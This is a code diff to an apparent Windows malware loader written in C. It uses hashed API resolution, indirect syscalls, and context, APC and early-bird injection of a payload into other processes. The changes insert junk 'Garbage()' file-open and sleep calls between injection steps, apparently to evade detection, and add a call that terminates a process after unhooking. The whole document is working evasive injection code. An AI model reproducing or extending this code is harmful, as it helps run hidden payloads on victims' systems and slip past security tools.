@@ -6,14 +6,16 @@ EXTERN_C void indirectSyscall(...);
 
 void Garbage()
 {
-	for (int i = 0; i < 3; i++)
+	for (int i = 0; i < 2; i++)
 	{
 		OFSTRUCT temp;
 		Sleep(100);
 		OpenFile((LPCSTR)"conf.txt", &temp, OF_READ);
+		GetLastError();
 		GetTickCount();
 		Sleep(100);
 		OpenFile((LPCSTR)"config.txt", &temp, OF_READ);
+		GetLastError();
 	}
 }
 
@@ -87,6 +89,14 @@ void Unhook(node* head, const char* process_name, HANDLE target)
 	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
 	syscall_number = getSyscallbyHash(head, 0x82962c8);
 	indirectSyscall(target, (PVOID*)&pSectionVA, &sizeToCopy, oldprotect1, &oldprotect2);
+
+
+	Garbage();
+
+	NtTerminateProcess_t pNtTerminateProcess = (NtTerminateProcess_t)getAddressbyHash(head, 0x1703ab2f);
+	syscall_address = findSyscall((unsigned char*)pNtTerminateProcess);
+	syscall_number = getSyscallbyHash(head, 0x1703ab2f);
+	indirectSyscall(pi.hProcess, 0);
 }
 
 #ifdef THREADINJECTION
@@ -205,9 +215,9 @@ void ContextInjection(node* head, const char* process_name, unsigned char* paylo
 	syscall_address = findSyscall((unsigned char*)pNtSetContextThread);
 	syscall_number = getSyscallbyHash(head, 0x308be0d0);
 	indirectSyscall(threads[0], &ctx);
-	GetLastError();
+	
 	Unhook(head, process_name, hProc);
-	GetLastError();
+
 	Garbage();
 
 	for (int i = 0; i < n_threads; i++)
@@ -286,6 +296,8 @@ void APCLazyInjection(node* head, const char* process_name, unsigned char* paylo
 	syscall_number = getSyscallbyHash(head, 0x5003c058);
 	indirectSyscall(&hProc, PROCESS_ALL_ACCESS, &attributes, &cid);
 
+	Garbage();
+
 	HANDLE threads[20];
 	unsigned int n_threads = 0;
 	FindThread(pid, threads, &n_threads);
@@ -297,24 +309,23 @@ void APCLazyInjection(node* head, const char* process_name, unsigned char* paylo
 	syscall_number = getSyscallbyHash(head, 0x6793c34c);
 	indirectSyscall(hProc, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);
 
+	Garbage();
+
 	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
 	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
 	syscall_number = getSyscallbyHash(head, 0x95f3a792);
 	indirectSyscall(hProc, pRemoteCode, payload, payload_len, NULL);
+
+	Garbage();
 
 	DWORD oldprotect = 0;
 	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
 	syscall_address = findSyscall((unsigned char*)pNtProtectVirtualMemory);
 	syscall_number = getSyscallbyHash(head, 0x82962c8);
 	indirectSyscall(hProc, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);
-	/*for (int i = 0; i < n_threads; i++)
-	{
-		Sleep(5*1000);
-		NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
-		syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
-		syscall_number = getSyscallbyHash(head, 0xd4612238);
-		indirectSyscall(threads[i], pRemoteCode, NULL, NULL, 0);
-	}*/
+
+	Garbage();
+
 	NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
 	syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
 	syscall_number = getSyscallbyHash(head, 0xd4612238);
@@ -339,6 +350,8 @@ void APCEagerInjection(node* head, const char* process_name, unsigned char* payl
 	CreateProcessA_t pCreateProcessA = (CreateProcessA_t)custom_GetProcAddress(kernel32, 0xaeb52e19);
 	pCreateProcessA(NULL, (LPSTR)process_name, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
+	Garbage();
+
 	LPVOID pRemoteCode = NULL;
 	SIZE_T memorySize = payload_len;
 	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)getAddressbyHash(head, 0x6793c34c);
@@ -346,10 +359,14 @@ void APCEagerInjection(node* head, const char* process_name, unsigned char* payl
 	syscall_number = getSyscallbyHash(head, 0x6793c34c);
 	indirectSyscall(pi.hProcess, (PVOID*)&pRemoteCode, NULL, &memorySize, MEM_COMMIT, PAGE_READWRITE);
 
+	Garbage();
+
 	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)getAddressbyHash(head, 0x95f3a792);
 	syscall_address = findSyscall((unsigned char*)pNtWriteVirtualMemory);
 	syscall_number = getSyscallbyHash(head, 0x95f3a792);
 	indirectSyscall(pi.hProcess, pRemoteCode, payload, payload_len, NULL);
+
+	Garbage();
 
 	DWORD oldprotect = 0;
 	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)getAddressbyHash(head, 0x82962c8);
@@ -357,10 +374,14 @@ void APCEagerInjection(node* head, const char* process_name, unsigned char* payl
 	syscall_number = getSyscallbyHash(head, 0x82962c8);
 	indirectSyscall(pi.hProcess, (PVOID*)&pRemoteCode, &memorySize, PAGE_EXECUTE_READ, &oldprotect);
 
+	Garbage();
+
 	NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)getAddressbyHash(head, 0xd4612238);
 	syscall_address = findSyscall((unsigned char*)pNtQueueApcThread);
 	syscall_number = getSyscallbyHash(head, 0xd4612238);
 	indirectSyscall(pi.hThread, pRemoteCode, NULL, NULL, 0);
+
+	Garbage();
 
 	NtResumeThread_t pNtResumeThread = (NtResumeThread_t)getAddressbyHash(head, 0x2c7b3d30);
 	syscall_address = findSyscall((unsigned char*)pNtResumeThread);
